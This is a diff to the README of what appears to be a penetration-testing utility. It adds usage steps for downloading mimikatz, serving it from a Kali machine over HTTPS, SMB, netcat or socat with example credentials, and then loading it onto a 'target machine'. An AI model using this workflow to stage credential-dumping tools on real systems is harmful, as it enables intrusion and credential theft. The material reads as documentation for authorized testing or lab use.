@@ -8,12 +8,28 @@ pip install pyftpdlib pyopenssl colorama psutil
 
 ## Usage
 
-1. Run the http temp server on Kali
+1. Download tool
 ```bash
-servpy [-h] [-p PORT] [-u USER] [-f FILE] [-i INTERFACE] [-pw PASSWORD] {http,ftp,smb,https,ftps}
+toolpy -t mimikatz -a x64  
+```
+```bash
+-h, --help 
+-t {tool}
+-s {windows,linux}, --system {windows,linux}
+-a {x86,x64}, --arch {x86,x64}
 ```
 
-2. Load the script on Target Machine
+2. Run the server
+```bash
+servpy [-h] [-p PORT] [-u USER] [-f FILE] [-i INTERFACE] [-pw PASSWORD] {http,ftp,smb,http,https,ftps,scp,socat,nc}
+servpy https -p 8080 -u kermit -pw Password123 -f mimikatz.exe
+servpy smb -u kermit -pw kermit123 -f mimikatz.exe -t
+-t: Print commands without starting any service
+servpy servers: Show server one liners
+servpy paths: Recomended paths for downloads
+```
+
+3. Load the script on Target Machine
 
 For Linux
 ```bash
